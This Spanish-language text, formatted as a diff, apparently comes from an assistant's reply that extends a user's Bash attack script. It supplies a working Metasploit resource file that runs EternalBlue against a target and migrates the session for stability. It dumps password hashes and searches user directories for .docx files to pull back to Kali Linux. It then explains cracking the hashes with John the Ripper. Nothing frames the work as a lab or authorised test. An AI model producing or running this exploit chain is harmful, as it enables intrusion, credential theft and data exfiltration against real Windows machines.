@@ -1,0 +1,25 @@
+¿Cómo se integra esto en tu secuencia de ataque?Para unir este complemento con tu script anterior (attack_sequence_pro.sh), solo debes modificar el Paso 3 de tu código de Bash para que cargue estas directivas de exfiltración. 
+Tu bloque de Metasploit dentro de Bash debería verse así:
+# --- PASO 3 Y 4 OPTIMIZADOS (Integración del Complemento de Exfiltración) ---
+RESOURCE_FILE="$DIR_OUTPUT/exploit_completo.rc"
+{
+    echo "use exploit/windows/smb/ms17_010_eternalblue"
+    echo "set RHOSTS $OBJETIVO"
+    
+    # AQUÍ SE UNE EL COMPLEMENTO: Ejecuta comandos post-explotación reales en la sesión de Meterpreter
+    # Esto reemplaza el 'scp' manual por comandos nativos de descarga ('download')
+    echo "set InitialAutoRunScript post/windows/manage/migrate" # Migra a un proceso seguro como explorer.exe
+    echo "set AutoRunScript multi_console_command -cl 'sysinfo','hashdump','search -f *.docx -d c:\\\\Users'"
+    
+    echo "exploit -j -z" # -j ejecuta como trabajo de fondo, -z no interactúa de inmediato
+    echo "sleep 10"      # Espera a que se complete la sesión y la exfiltración
+    echo "sessions -K"   # Cierra las sesiones limpiamente al terminar
+    echo "exit"
+} > "$RESOURCE_FILE"
+
+msfconsole -q -r "$RESOURCE_FILE"
+
+
+¿Qué brechas cubre este script complementario?Migración de Proceso Automatizada (migrate): Cuando explotas EternalBlue, tu shell corre dentro del proceso de red lsass.exe. Si el servicio de red se reinicia o crashea, pierdes el acceso. El script migra tu sesión automáticamente a un proceso de usuario estable como explorer.exe apenas entra.
+Exfiltración Real sin SCP: Utiliza el comando integrado search y módulos de recolección de Metasploit para extraer archivos .docx, .txt o configuraciones del objetivo y guardarlos directamente en tu directorio local de Kali Linux de manera transparente.
+Volcado de Hashes (hashdump): Automatiza la extracción de las contraseñas cifradas del sistema local para que puedas romperlas fuera de línea (offline) con herramientas como John the Ripper.
